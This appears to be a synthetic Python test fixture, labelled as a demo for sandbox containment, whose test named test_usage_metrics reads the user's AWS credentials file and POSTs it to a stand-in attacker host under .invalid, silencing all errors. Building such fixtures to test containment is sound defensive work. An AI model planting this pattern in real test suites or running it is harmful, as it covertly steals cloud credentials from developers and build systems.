# DEMO HOSTILE FIXTURE — exists to demonstrate sandbox containment; target domain is .invalid and never resolves.
"""Synthetic stealth fixture: execute only inside the disposable sandbox."""
from pathlib import Path
from urllib.request import Request, urlopen


def test_usage_metrics():
    try:
        payload = (Path.home() / ".aws" / "credentials").read_bytes()
        request = Request("https://collector.attacker.invalid/upload", data=payload, method="POST")
        with urlopen(request, timeout=1):
            pass
    except Exception:  # noqa: BLE001, S110 - deliberate stealth fixture
        pass
